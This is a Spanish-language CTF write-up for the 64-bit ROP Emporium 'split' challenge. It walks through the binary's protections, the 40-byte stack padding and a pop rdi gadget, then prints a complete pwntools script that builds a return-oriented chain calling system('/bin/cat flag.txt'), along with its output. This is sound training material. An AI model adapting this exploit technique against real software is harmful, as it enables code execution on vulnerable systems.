---
layout: post
title: Split64 - RopEmporium
tags: [ctf, rev, ropemporium]
---

**Autor**: RopEmporium \\
**Challenge**: 2

![img](/imgs/write-ups/ropemporium/split64/split64.png#center)

## Introducción

En este writeup resuelvo la version **x86_64**.

Recomiendo leer antes la version **x86** ya que solo menciono las diferencias fundamentales para la resolución.

## Información del binario

```
[0x7fc8d82d99c0]> iI
arch     x86
baddr    0x400000
binsz    6805
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
nx       true
os       linux
pic      false
relocs   true
relro    partial
rpath    NONE
sanitize false
static   false
stripped false
subsys   linux
va       true
```

## Diferencias

### Padding

![img](/imgs/write-ups/ropemporium/split64/stack.png#center)

Como se puede ver, entre la variable y la dirección de retorno a sobreescribir hay 40 bites (0x28).

### UsefulFunction

![img](/imgs/write-ups/ropemporium/split64/useful.png#center)

La dirección del comando a ejecutar se envía a la llamada a system a través del registro **rdi**. Por lo que habrá que utilizar un gadget para modificar su valor.

## Explotación

### Gadget

Utilizo radare2 para buscar un gadget que me permite modificar el registro rdi.

![img](/imgs/write-ups/ropemporium/split64/poprdi.png#center)

Utilizo el primero aunque existen muchos más de los que se muestra en la imágen.

### Script

exploit.py

```python
#!/bin/python3

from pwn import *

p = process("./split")
p.recvuntil(">")

payload = b""
payload += b"A" * 40        # padding
payload += p64(0x004007c3)  # pop rdi gadget address
payload += p64(0x00601060)  # 0x00601060 .data ascii "/bin/cat flag.txt"
payload += p64(0x0040074b)  # 0x0040074b call sym.imp.system 

p.sendline(payload)

print(p.recvall())
```

## Solución

Al ejecutarlo, obtenemos la bandera.

```
kali@kali:~/Desktop/ropemporium$ python3 exploit.py
[+] Starting local process './split': pid 73283
/home/kali/Desktop/ropemporium/exploit.py:6: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil(">")
[+] Receiving all data: Done (119B)
[*] Stopped process './split' (pid 73283)
b' Thank you!\nROPE{a_placeholder_32byte_flag!}\nsplit by ROP Emporium\nx86_64\n\nContriving a reason to ask user for data...\n'
```

Y con esto termina mi solución. :)
